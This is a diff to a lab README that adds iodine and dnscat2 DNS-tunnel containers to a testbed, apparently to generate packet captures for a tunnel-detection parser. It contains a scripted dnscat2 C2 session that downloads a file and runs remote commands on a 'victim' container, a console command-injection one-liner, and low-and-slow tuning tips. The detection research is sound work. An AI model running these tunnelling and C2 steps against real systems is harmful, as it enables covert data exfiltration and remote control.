@@ -4,7 +4,7 @@ Two tunnel tools, each a pair of containers on the card-5 `lab` network, driven 
 interface so captures can be scripted the same way for all four tools:
 
 ```bash
-testbed/run_tool.sh --tool <dns2tcp|dnsexfiltrator> --size <bytes> --rate <bytes-per-second> [--minutes M] [--capture] [--out DIR]
+testbed/run_tool.sh --tool <dns2tcp|dnsexfiltrator|iodine|dnscat2> --size <bytes> --rate <bytes-per-second> [--delay MS] [--qtype T] [--encoding E] [--minutes M] [--capture] [--out DIR]
 ```
 
 `--size`/`--rate` are the same words Justin's card-6 tools take, but read them
@@ -33,6 +33,11 @@ Everything here lives in `testbed/tools/docker-compose.yml`, joins the running
 | `dnsexfiltrator-ns`  | `dnsexfiltrator` | 172.28.0.41 | DNS server **and** collector (our Python 3 `server.py`)     |
 | `dnsexfiltrator-cli` | `dnsexfiltrator` | 172.28.0.43 | exfil client, `dns:` pointed at 172.28.0.41                |
 
+| `iodine-server`      | `iodine`       | 172.28.0.20  | `iodined`, authoritative for `i.tunnel.test`, tunnel gateway 10.0.0.1 |
+| `iodine-client`      | `iodine`       | 172.28.0.30  | `iodine` client, dials in **through the resolver** (172.28.0.2) |
+| `dnscat2-server`     | `dnscat2`      | 172.28.0.21  | dnscat2 Ruby server, authoritative for `d.tunnel.test`       |
+| `dnscat2-client`     | `dnscat2`      | 172.28.0.31  | dnscat2 C client, C2 beacon **through the resolver**         |
+
 Static IPs are deliberate: the parser labels traffic by source address, and
 `scripts/parse_capture.py` keeps that mapping in one place (`--tools-map`).
 
@@ -42,6 +47,74 @@ names appear. If the group later wants everything through the one resolver, add 
 per-zone forward (`dns2tcp.tunnel.test` -> 172.28.0.42, `exfil.tunnel.test` ->
 172.28.0.41) to `testbed/resolver/named.conf` and drop the `dns:` lines — that is Justin's
 file, so it is not done here.
+
+## iodine and dnscat2
+
+These two go through the resolver, which forwards `i.tunnel.test` to 172.28.0.20 and
+`d.tunnel.test` to 172.28.0.21 (`testbed/resolver/named.conf`). Because of that,
+`--capture` records on the **client** container: there the query's source address is the
+compromised host. At the tool server every query would appear to come from the resolver.
+
+```bash
+./run_tool.sh --tool iodine  --size 65536 --rate 1024 --minutes 1 --capture   # 1024 B/s, 1-minute capture
+./run_tool.sh --tool iodine  --size 8192 --qtype TXT --encoding Base32 --capture
+./run_tool.sh --tool dnscat2 --size 4096 --rate 2 --minutes 1 --capture       # 2 queries/s
+./run_tool.sh --tool dnscat2 --size 1024 --delay 5000 --qtype TXT --capture   # low-and-slow, 1 query / 5 s
+```
+
+| flag | iodine | dnscat2 |
+| ---- | ------ | ------- |
+| `--size` | random bytes sent over TCP to the tunnel gateway; the server counts them | a random file the operator **downloads** from the victim; md5 must match on the server |
+| `--rate` | bytes/second, paced with `pv` | queries/second (1-20), shorthand for `--delay 1000/N` |
+| `--delay` | milliseconds, rounded up to whole seconds for `iodine -I` | milliseconds, passed as `dnscat --delay <ms> --steady` |
+| `--qtype` | `iodine -T`: NULL, PRIVATE, TXT, SRV, MX, CNAME, A | dnscat2 `type=`: TXT, CNAME, MX, A, AAAA (comma list allowed) |
+| `--encoding` | `iodine -O` downstream encoding: Base32, Base64, Base64u, Base128, Raw (ignored by iodine for NULL) | not supported |
+| `--minutes` | keep tunnel and capture open until that long after the transfer started | same |
+
+`--delay` (or dnscat2's `--rate`) is the value written to the contract's `throttle`
+column; without it the tool default applies and `throttle` is 0. The client container is
+recreated when a setting changes. For low-and-slow runs use `--delay`: on dnscat2 it is
+exact (one query per delay); on iodine pace the data with a small `--rate` as well,
+because `-I` only sets how often the idle tunnel polls.
+
+**The dnscat2 run is a scripted C2 session**, not a bulk copy. The `dnscat2-client`
+container beacons in as a command session and `run_tool.sh` plays the operator on the
+server console: `ping`, `download` of the `--size` file, then `exec id` and
+`exec hostname`, each of which opens its own short session from the victim. The console
+is the FIFO `/tmp/console` inside `dnscat2-server`, so you can add your own commands:
+
+```bash
+docker exec dnscat2-server sh -c 'printf "window -i 2\nexec whoami\n" > /tmp/console'
+docker logs -f dnscat2-server        # everything the server receives (--firehose)
+```
+
+Acceptance, as run on 14 Nov 2026 (one-minute capture of each tool, parsed with
+`python -m parser pcap`):
+
+* dnscat2 `--size 4096 --rate 2 --minutes 1 --capture` → `PASS 4096 bytes downloaded from
+  the victim in 24s`, `PASS 2 remote commands ran on the victim`, 133 queries over 59.2 s
+  (CNAME 46, MX 44, TXT 43), all from 172.28.0.31, all with a reply.
+* iodine `--size 65536 --rate 1024 --minutes 1 --capture` → `PASS 65536 bytes through the
+  iodine tunnel in 61s`, 1284 queries over 58.9 s (all NULL), all from 172.28.0.30.
+
+Things worth knowing before trusting a capture:
+
+* iodine switches its upstream codec to Base128, so query names carry raw 8-bit bytes
+  and the record type is NULL. `scripts/parse_capture.py` keeps them as one character per
+  byte (latin-1); a UTF-8-only reader drops almost every iodine query.
+* dnscat2 sends an `--exec` command string as the session name in its first packet, and a
+  long one makes the client abort on an assertion. Keep console `exec` commands short.
+* The dnscat2 console parses a leading dash in a command as its own option, so
+  `exec uname -a` does nothing. Use commands without flags.
+* dnscat2 only obeys `--delay` during a transfer when `--steady` is set; otherwise it
+  sends the next packet as soon as a reply arrives. `run_tool.sh` sets both.
+* The dnscat2 server must keep its cache on (no `--no-cache`): the resolver re-sends
+  queries, and without the cache the session breaks with SERVFAIL after the handshake.
+* The capture starts after the beacon is up, so the beacon's own handshake is not in the
+  pcap; the two `exec` sessions each contribute a full handshake.
+* The dnscat2 client container is a live beacon. Stop the profile when you are done, or
+  it keeps querying during someone else's capture:
+  `docker compose -f tools/docker-compose.yml --profile iodine --profile dnscat2 down`
 
 ## Run
 
